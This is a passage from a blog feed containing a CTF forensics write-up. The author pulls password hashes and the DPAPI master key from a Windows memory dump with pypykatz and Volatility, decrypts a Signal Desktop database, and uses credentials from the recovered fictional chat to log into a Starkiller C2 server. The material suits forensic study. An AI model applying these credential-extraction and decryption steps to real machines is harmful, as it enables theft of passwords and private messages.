</span></span><span style="display:flex;"><span>HMAC_length: <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>to_sign: b<span style="color:#e6db74">&#39;\x01\x00\x00\x00\xfc\xb6q\xab\xb8\xd0{M\xaa\x12n\xce\x19\xff\x19\x17\x10\x00\x00\x00\x12\x00\x00\x00C\x00h\x00r\x00o\x00m\x00i\x00u\x00m\x00\x00\x00\x10f\x00\x00\x00\x01\x00\x00 \x00\x00\x00\x8ajC\xef\t`\xdeE\xd7\x9f\xdfH\xa4\xfbD_\x1d5\x17\x85\n\xdf\x01\xd7\xdc\x10\xeb\xb3~\xff,\r\x00\x00\x00\x00\x0e\x80\x00\x00\x00\x02\x00\x00 \x00\x00\x00\x1aw\xd0GIQnbb4\x0f\xc4\x06\xf7\xdd\xb8\xc4\xbe)\xcd\xec\x14\xd4\xb7\xa6\x1af\x93\x95&lt;\xdc:0\x00\x00\x00 \xd1#F[\xf3O\xe1\xe8\x1a(K\xf4N\t}$M\xdd\xd2\xd1P\xa7\x1e\x86\xeaS\x1c\xa0\xe9E\xdcL\x91\xfd\xda\xf4\x85\xb6\xc1m\t,LI\x04\t\xcc&#39;</span>
</span></span></code></pre></div><p>Yay, data.</p>
<h2 id="decrypting-the-blob">Decrypting the blob</h2>
<p>Now we have the our encrypted <code>DPAPI_BLOB</code>, but we still need the master key to retrieve it.</p>
<p>If you read the earlier bit about <a href="#a-brief-aside---dpapi">DPAPI</a>, you&rsquo;ll know that the master key seed is stored in the <code>%APPDATA\Roaming\Microsoft\Protect\[USER_SID]</code> folder in a file with the same name as the GUID of the master key. In this case, we know from the blob that we are looking for a master key with a GUID of <code>ab71b6fc-d0b8-4d7b-aa12-6ece19ff1917</code>, so we know exactly what file we&rsquo;re looking for. It&rsquo;s contents are here, decoded once again by <code>pypykatz</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jeremydunn@Jeremys-MacBook-Pro % pypykatz dpapi describe masterkey backup/Users/frontier-user-01/AppData/Roaming/Microsoft/Protect/S-1-5-21-1208348762-991206961-812773293-1001/ab71b6fc-d0b8-4d7b-aa12-6ece19ff1917
</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span> MasterKeyFile <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>version: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>unk1: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>unk2: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>guid: ab71b6fc-d0b8-4d7b-aa12-6ece19ff1917
</span></span><span style="display:flex;"><span>unk3: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>policy: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>flags: <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>masterkey_length: <span style="color:#ae81ff">176</span>
</span></span><span style="display:flex;"><span>backupkey_length: <span style="color:#ae81ff">144</span>
</span></span><span style="display:flex;"><span>credhist_length: <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>domainkey_length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>masterkey: <span style="color:#f92672">==</span> MasterKey <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>version: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>salt: b<span style="color:#e6db74">&#39;\x95T\xd8\xdb\r\r\xaa:\x93\x93\x1f\xaf?Z_\x9b&#39;</span>
</span></span><span style="display:flex;"><span>iteration_count: <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>hash_algorithm: <span style="color:#ae81ff">32782</span>
</span></span><span style="display:flex;"><span>crypto_algorithm: <span style="color:#ae81ff">26128</span>
</span></span><span style="display:flex;"><span>data: b<span style="color:#e6db74">&#39;^x\x0c\xe9\x94,\xff\xe5\x9e\xa2\xcb\x82\xb2\xed[\x82-\x848&gt;\xbe3\x10c\x83.{\xab\xd1\xf5\xb7\xf5\xda\xff`\x9e\xe5\xac\xbf6L\xdc\xc0\xec\xeb\x9c\xf0\xa6\x8bI=\xf9\xbeLh\xf5=\x14X\xadM\xb7-\xeeY\xbd\xff\x12D\xa3\xeb\x18,v\x8e\x11\x02\xd9\xcf\x19\x80\x9d\xab\x04B\xe3\xb0\xa9\xbd!N\xd6\x1d\xf3?\x1eR\xff\x906\xab\tm\x19J\xb8\nA\xe5a\x0b\x92\xcd\x06-}\xa7\xac\n\xac\xae\x1e7\xb1\xbe\xad]\xb6\xe7\x14r.\xb10\x9b*?\x08\xdf/,\x1b89&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>backupkey: <span style="color:#f92672">==</span> MasterKey <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>version: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>salt: b<span style="color:#e6db74">&#39;q\xb0\xcc\\b[\x8d&lt;\xc8\xdf\xc8\xa5\xdfh;\x83&#39;</span>
</span></span><span style="display:flex;"><span>iteration_count: <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>hash_algorithm: <span style="color:#ae81ff">32782</span>
</span></span><span style="display:flex;"><span>crypto_algorithm: <span style="color:#ae81ff">26128</span>
</span></span><span style="display:flex;"><span>data: b<span style="color:#e6db74">&#39;\xe1tq~I\xe1m\xf6&#34;\x02R\xc0\x81~h\xcfAzA\x85\xe8\x0b\xdaP\xee_\xfa\xb6\xca\xfa\x05\xa9e\xf8\x1et\xf4\x89\xf4B\x1d\xd8\x9c\xbf\xbc\xfc\x90t\xb4\x8a\x83$\xe4E\x80\x038\x8f6M\xe1\x98@\xd7\xe7\x1aYU\x87\xa4q)\x7f\n\x0c\xa7&gt;,\xb1gU\xfeK\x86)N\xc3/\xaa\xea\x7f\xa8\xc4\xf8\xf7\x1f\xe0\xd3\xb8\xab\x0b\xe1\xfaY\x9e\xc8\x0f\xcd#\x83I\xf9&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>credhist: <span style="color:#f92672">==</span> CredHist <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>version: <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>guid: b<span style="color:#e6db74">&#39;\x1c\xfe\xf2\x8fg~\xe0C\xa3\xbf8\xde#\x87p\xb5&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>domainkey: None
</span></span></code></pre></div><p>Great, now all we need are the user&rsquo;s SID and a SHA1 hash of the user&rsquo;s password. We have the SID obviously (it&rsquo;s the folder name) but how can we get the SHA1 hash?</p>
<p>Fortunately for us, the SHA1 hash of the user&rsquo;s password is yet another thing that is stored in the LSA. There are any number of ways to parse this out of the memory dump, but the cleanest one I found was this very nice <a href="https://github.com/skelsec/pypykatz-volatility3">pypykatz Volatility3 plugin</a>. Just run the plugin, and we get:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jeremydunn@Jeremys-MacBook-Pro % vol -f win10_memdump.elf -p pypykatz-volatility3 pypykatz
</span></span><span style="display:flex;"><span>Volatility <span style="color:#ae81ff">3</span> Framework 2.8.0
</span></span><span style="display:flex;"><span>credtype	domainname	username	NThash	LMHash	SHAHash	masterkey	masterkey<span style="color:#f92672">(</span>sha1<span style="color:#f92672">)</span>	key_guid	password
</span></span><span style="display:flex;"><span>msv	DESKTOP-6MBJBAP	frontier-user-01	1d3e3e030ba1a179e1281406efd980bf		ded871d3a3992be2179840890d061c9f30a59a77
</span></span><span style="display:flex;"><span>dpapi						791ca70e650987684b043745c6f4b1c0f97eb2369317302c6c60f9cda19e1b4864fbece48341141501606d8d359ff7f54ee71e4a2b821d3df69582927742809f	8d53efa8456b9ba43206f4c3a6dc1c957d26105a	ab71b6fc-d0b8-4d7b-aa12-6ece19ff1917
</span></span><span style="display:flex;"><span>msv	DESKTOP-6MBJBAP	frontier-user-01	1d3e3e030ba1a179e1281406efd980bf		ded871d3a3992be2179840890d061c9f30a59a77
</span></span></code></pre></div><p>(Incidentally, yes, the calculated master key is also in the LSA. Doing the extra steps to derive it from the raw key is more interesting though)</p>
<p>Now, we can use pypykatz to generate some prekeys that will be used for master key decryption:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jeremydunn@Jeremys-MacBook-Pro % pypykatz dpapi prekey sha1 S-1-5-21-1208348762-991206961-812773293-1001 ded871d3a3992be2179840890d061c9f30a59a77
</span></span><span style="display:flex;"><span>d63766f8e020781d1b9c694b19af724aed16284b
</span></span><span style="display:flex;"><span>ded871d3a3992be2179840890d061c9f30a59a77
</span></span></code></pre></div><p>And use those prekeys to calculate the correct master key.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jeremydunn@Jeremys-MacBook-Pro % pypykatz dpapi masterkey ./backup/Users/frontier-user-01/AppData/Roaming/Microsoft/Protect/S-1-5-21-1208348762-991206961-812773293-1001/ab71b6fc-d0b8-4d7b-aa12-6ece19ff1917 prekeys.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>GUID<span style="color:#f92672">]</span> ab71b6fc-d0b8-4d7b-aa12-6ece19ff1917
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>MASTERKEY<span style="color:#f92672">]</span> 791ca70e650987684b043745c6f4b1c0f97eb2369317302c6c60f9cda19e1b4864fbece48341141501606d8d359ff7f54ee71e4a2b821d3df69582927742809f
</span></span></code></pre></div><p>Note that the master key does match the one pulled directly out of the memory dump.</p>
<p>Now, all we have to do is run the <code>DPAPI_BLOB</code> earlier through <code>pypykatz</code> with our new master key!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jeremydunn@Jeremys-MacBook-Pro % pypykatz dpapi blob masterkey_decrypted.json 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000fcb671abb8d07b4daa126ece19ff191710000000120000004300680072006f006d00690075006d0000001066000000010000200000008a6a43ef0960de45d79fdf48a4fb445f1d3517850adf01d7dc10ebb37eff2c0d000000000e80000000020000200000001a77d04749516e6262340fc406f7ddb8c4be29cdec14d4b7a61a6693953cdc3a3000000020d123465bf34fe1e81a284bf44e097d244dddd2d150a71e86ea531ca0e945dc4c91fddaf485b6c16d092c4c490409cc400000001dabab44b91b878c93703fbf8711baed57dad332c4209a503805b0e81203530fa344763702e214d30772c72e65bfa09911898842a51bc89497ccf20fa6a627eb
</span></span><span style="display:flex;"><span>HEX: 7582f084a7d00872eebe919c2c02da0a8f4d8e67e648bb55805e8994a8a165ef
</span></span><span style="display:flex;"><span>STR: 艵蓰킧爈뻮鲑Ȭ૚䶏枎䣦喻庀钉ꆨ
</span></span></code></pre></div><h2 id="decrypting-the-database">Decrypting the database</h2>
<p>This looks a lot like a raw database encryption key! Unfortunately, using it to try to open the SQL-Cipher file doesn&rsquo;t work. What&rsquo;s going on?</p>
<p>At this point, I reopened the trusty Signal backup software from eariler, and found something interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">// 3. Now decrypt the encrypted_key using the decrypted key from local state
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// the encrypted key (from step 1) is made up of
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// - a 3 byte header (&#39;v&#39;, &#39;1&#39;, &#39;0&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// - a 12 byte nonce
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// - 64 bytes of encrypted data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// - 16 bytes mac
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint64_t</span> header_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>header <span style="color:#f92672">=</span> encryptedkey_data.<span style="color:#a6e22e">get</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> nonce_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>nonce <span style="color:#f92672">=</span> encryptedkey_data.<span style="color:#a6e22e">get</span>() <span style="color:#f92672">+</span> header_length;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> mac_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>mac <span style="color:#f92672">=</span> encryptedkey_data.<span style="color:#a6e22e">get</span>() <span style="color:#f92672">+</span> (encryptedkey_data_length <span style="color:#f92672">-</span> mac_length);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> encdata_length <span style="color:#f92672">=</span> encryptedkey_data_length <span style="color:#f92672">-</span> mac_length <span style="color:#f92672">-</span> header_length <span style="color:#f92672">-</span> nonce_length;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>encdata <span style="color:#f92672">=</span> nonce <span style="color:#f92672">+</span> nonce_length;
</span></span></code></pre></div><p>The first three bytes of <code>encrypted_key</code> are yet another header. The next 12 are a nonce, 64 bytes of encrypted data, and a 16 byte mac respectively. These seem like parameters for an authenticated encryption scheme. My suspicions were confirmed when I found these lines of code later in the program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Create and initialize the decryption context &amp; cipher
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>EVP_CIPHER_CTX, <span style="color:#a6e22e">decltype</span>(<span style="color:#f92672">&amp;::</span>EVP_CIPHER_CTX_free)<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">ctx</span>(<span style="color:#a6e22e">EVP_CIPHER_CTX_new</span>(), <span style="color:#f92672">&amp;::</span>EVP_CIPHER_CTX_free);
</span></span><span style="display:flex;"><span>std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>EVP_CIPHER, <span style="color:#a6e22e">decltype</span>(<span style="color:#f92672">&amp;::</span>EVP_CIPHER_free)<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">cipher</span>(<span style="color:#a6e22e">EVP_CIPHER_fetch</span>(NULL, <span style="color:#e6db74">&#34;AES-256-GCM&#34;</span>, NULL), <span style="color:#f92672">&amp;::</span>EVP_CIPHER_free);
</span></span></code></pre></div><p>So we&rsquo;re dealing with <code>AES-256-GCM</code>. <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Galois/Counter Mode</a> is one of the most common methods of modern authenticated encryption, which describes crypto-systems that allow for verifiying the integrity of the data that was encrypted as a native part of the encryption scheme, which a more basic construction like <code>AES-CBC$</code> would not do.</p>
<p>That said, cryptography isn&rsquo;t the point of this blog post, so we&rsquo;ll skip the nitty-gritty details (as cool as GCM is). What we need is the ciphertext that was encrypted using <code>encrypted_key</code>. Although it isn&rsquo;t explicity mentioned anywhere, I had a pretty good idea of where the ciphertext could be found. Remember <code>config.json</code>, with our <code>encryptedKey</code> that was definitely not a <code>DPAPI_BLOB</code>?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;encryptedKey&#34;</span>: <span style="color:#e6db74">&#34;763130cc1843cbf3949e872b373031e89c85f8e8d6e9ec3bd9340bb9c6fd844ca424d7e666feac3663f6c2810d6ddbdfb82f7faa4456eda119bacd2709fc2404eeeb74e69b2b3f2f71e765b74a068c5549a1871559d537de08a25c700a97cd&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s try to decrypt it using <code>AES-256-GCM</code> and the key retrieved from <code>encrypted_key</code> above.</p>
<p>Parsed out, <code>encryptedKey</code> from <code>config.json</code> looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;header&#34;</span>: <span style="color:#e6db74">&#34;763130&#34;</span>, <span style="color:#75715e">// (&#39;v&#39;, &#39;1&#39;, &#39;0&#39;) in ASCII hex
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&#34;nonce&#34;</span>: <span style="color:#e6db74">&#34;cc1843cbf3949e872b373031&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;encrypted_data&#34;</span>: <span style="color:#e6db74">&#34;e89c85f8e8d6e9ec3bd9340bb9c6fd844ca424d7e666feac3663f6c2810d6ddbdfb82f7faa4456eda119bacd2709fc2404eeeb74e69b2b3f2f71e765b74a068c&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;mac&#34;</span>: <span style="color:#e6db74">&#34;5549a1871559d537de08a25c700a97cd&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can use <a href="https://gchq.github.io/CyberChef">CyberChef</a> to decrypt the data. A link to the exact recipe I used is <a href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'7582f084a7d00872eebe919c2c02da0a8f4d8e67e648bb55805e8994a8a165ef'%7D,%7B'option':'Hex','string':'cc1843cbf3949e872b373031'%7D,'GCM','Hex','Raw',%7B'option':'Hex','string':'5549a1871559d537de08a25c700a97cd'%7D,%7B'option':'Hex','string':''%7D)&amp;input=ZTg5Yzg1ZjhlOGQ2ZTllYzNiZDkzNDBiYjljNmZkODQ0Y2E0MjRkN2U2NjZmZWFjMzY2M2Y2YzI4MTBkNmRkYmRmYjgyZjdmYWE0NDU2ZWRhMTE5YmFjZDI3MDlmYzI0MDRlZWViNzRlNjliMmIzZjJmNzFlNzY1Yjc0YTA2OGM">here</a>.</p>
<p><img src="./images/8_cyberchef-decode.png" alt="Cyberchef decode"></p>
<p>Now we can go ahead and open the database with <a href="https://sqlitebrowser.org/">DB Browser for SQLite</a>.</p>
<p><img src="./images/9_sqlite-open.png" alt="sqlite password screen"></p>
<p>And, it opens!</p>
<p><img src="./images/10_sqlite-open.png" alt="sqlite database open"></p>
<p><img src="./images/11_great-success.gif" alt="Borat gif"></p>
<h2 id="finding-the-messages">Finding the messages</h2>
<p>A quick scan of the database structure shows that the messages are stored in the <code>json</code> field of the <code>messages</code> table. It&rsquo;s a bit odd to store serialized json objects within a SQL database, but hey, it&rsquo;s not nearly the weirdest thing we&rsquo;ve seen so far, so let&rsquo;s roll with it.</p>
<p><img src="./images/12-messages.png" alt="messages table"></p>
<p>A quick sql query pulls out all of the json objects with the message data.</p>
<p><img src="./images/13_retrieved-messages.png" alt="messages retrieved"></p>
<p>A typical message looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;timestamp&#34;</span>: <span style="color:#ae81ff">1731461048464</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;attachments&#34;</span>: [],
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;0193215c-2c24-76f3-a72a-9ee52ade121d&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;received_at&#34;</span>: <span style="color:#ae81ff">1731431509028</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;conversationId&#34;</span>: <span style="color:#e6db74">&#34;84e86b7b-e012-4914-a9c1-f78bff32391d&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;readStatus&#34;</span>: <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;received_at_ms&#34;</span>: <span style="color:#ae81ff">1731461048688</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;seenStatus&#34;</span>: <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sent_at&#34;</span>: <span style="color:#ae81ff">1731461048464</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;serverGuid&#34;</span>: <span style="color:#e6db74">&#34;8a1537e1-cf59-4513-b88a-dd868a95fb1b&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;serverTimestamp&#34;</span>: <span style="color:#ae81ff">1731461049368</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sourceDevice&#34;</span>: <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sourceServiceId&#34;</span>: <span style="color:#e6db74">&#34;2faa6b1d-1d1e-4fc7-a7e5-46c07a18aa47&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;incoming&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;unidentifiedDeliveryReceived&#34;</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;schemaVersion&#34;</span>: <span style="color:#ae81ff">14</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;body&#34;</span>: <span style="color:#e6db74">&#34;Alright Ace, let’s get this operation underway!&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;bodyRanges&#34;</span>: [],
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;contact&#34;</span>: [],
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;decrypted_at&#34;</span>: <span style="color:#ae81ff">1731461048849</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;errors&#34;</span>: [],
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;flags&#34;</span>: <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;hasAttachments&#34;</span>: <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;isViewOnce&#34;</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;mentionsMe&#34;</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;preview&#34;</span>: [],
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;requiredProtocolVersion&#34;</span>: <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;supportedVersionAtReceive&#34;</span>: <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Clearly, the body field contains the content of the message.  I exported the messages to a <code>json</code> file from DB Browser, then used the following Python script to pull out all of the <code>body</code> fields from messages that had them and reconstruct the conversation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;messages.json&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> fd:
</span></span><span style="display:flex;"><span>    raw <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(fd<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> list(map(<span style="color:#66d9ef">lambda</span> x: json<span style="color:#f92672">.</span>loads(x[<span style="color:#e6db74">&#39;json&#39;</span>]), raw)):
</span></span><span style="display:flex;"><span>    print(y[<span style="color:#e6db74">&#34;body&#34;</span>] <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;body&#34;</span> <span style="color:#f92672">in</span> y<span style="color:#f92672">.</span>keys() <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;&#34;</span>)
</span></span></code></pre></div><p>It&rsquo;s not the prettiest code ever written, but it did the job.  The message thread that it pulled out is below:</p>
<pre tabindex="0"><code>Alright Ace, let’s get this operation underway!
We’ll need a solid C2 server
I was thinking maybe Sliver, Havoc or Empire! What do you think?
Empire works. It&#39;s reliable versatile and runs quiet!
Plus, it&#39;s got those nifty user access controls, keeps things tidy in case we want to bring in more gunslingers later. We&#39;re set to expand if need be!
Good thinking! This setup needs to hold up under pressure. No room for slip-ups!!
Agreed!
I&#39;ll get Starkiller loaded up on one of the dead satellites orbiting the belt, should mask our activity as stray signals
I&#39;ll use a few spoofed IPs and a layered encryption stack for extra cover, but there&#39;s a catch
What catch?
Empire&#39;s not exactly &#34;low-maintenance&#34; for this kind of op. Its log storage can swell up if we&#39;re not careful.
if they start a data sweep, too many logs could leave a trail back to us!
Understood. Set the logs to overwrite every hour. Clear it up as we go
Can’t risk a breadcrumb trail…
Done!
Alright Empire is live. Credentials are almost set. Username is `empireadmin`. Will send the password later, need to change it and fix up some other things!
Noted
Now let’s discuss the main play
We are going after the loot in Free Station 47
Free Station 47... risky target, but that station is one of the last holdouts in the Cluster that&#39;s not under Frontier Board&#39;s control
They&#39;ve got civilian resources, medical supplies, independent traders, event intel of sage routes outside our surveillance
But I&#39;m getting the feeling this is not just about supplies... is it?
Exactly! Free Station 47 also shelters some of the best engineers and medics left in the frontier who are not loyal to us
When we seize those assets we will cripple resistance across the sector and send a clear message that nobody stands up to the board
I&#39;ll route a beacon to their communication relay, intercepting logs of incoming and outgoing transmissions. Might take a bit but we&#39;ll have a live feed on everything happening on their channels
But they&#39;ve got backup power sources. If they get alerted, they&#39;ll lock us out quickly!
So we’ll sabotage those power sources
While they’re fumbling with emergency power, we’re in and out
What about the station’s defense grid?
I can set up a signal jammer disguised as a drifting asteroid. It&#39;ll hover near their perimeter giving us about fifteen minutes to move before their secondary systems kick in.
Any longer, and we&#39;ll lose our window
Also, here&#39;s the password for Starkiller `eNSrj4qHp0pG#075D98@` Keep it safe boss!
That’s all we need Once we have the supplies and personnel data, we’ll rendezvous near Blackreach Comet
There’s an extraction pod if we need to make a quick getaway
Understood
We&#39;ll grab their resources, lock down the station, and disable their transmissions to cover our retreat
Good!
It’s time these rebels learned what happens when you they defy the Board!
Couldn&#39;t agree more, Boss!
Our new station is coming along really nicely
Nice work pulling that access credential for their medical wing, Ace!
What kind of clearance did it give us?
Full access, Boss!!
We&#39;re talking patient logs, personnel records, medical inventories
We can see where they&#39;re hiding critical resources and key personnel across the Cluster
Now that’s useful. Think we can make some of their inventory “disappear” without raising suspicion?
Absolutely! I&#39;ll re-route essential medical supplies to the Board&#39;s stations, bit by bit. Undetectable!
Plus, we&#39;ll use this access to plant a few hidden controls, let us override their systems whenever we need!
Perfect! Free Station 47’s supplies and people just became another tool for the Board’s expansion. Let’s bleed them dry!
</code></pre><p>From this conversation, we can see that the username for the Starkiller instance from earlier is <code>empireadmin</code> and the password is <code>eNSrj4qHp0pG#075D98@</code>.</p>
<h2 id="into-starkiller">Into Starkiller</h2>
<p>Using the credentials, I was able to log into Starkiller.</p>
<p>I clicked through a few screens, and eventually came to the stored credentials page, which is where the flag was stored.</p>
<p><img src="./images/14_starkiller_flag.png" alt="starkiller flag page"></p>
<h2 id="conclusions">Conclusions</h2>
<p>This was a really fun challenge, and provided a great opportunity to look further into Signal internals.  I couldn&rsquo;t find any resources online at all about decrypting the new Signal messages database, so this could actually end up being valuable information for real forensic investigations.  I may make up another more direct writeup on just the database decryption portion for easy reference.</p>
]]></content>
		</item>
		
		<item>
			<title>HackTheBox University CTF 2023 - ZombieNet</title>
			<link>https://stolenfootball.github.io/posts/writeups/2023/htb-uni-ctf/zombienet/</link>
			<pubDate>Tue, 17 Oct 2023 11:23:50 -0500</pubDate>
			
			<guid>https://stolenfootball.github.io/posts/writeups/2023/htb-uni-ctf/zombienet/</guid>
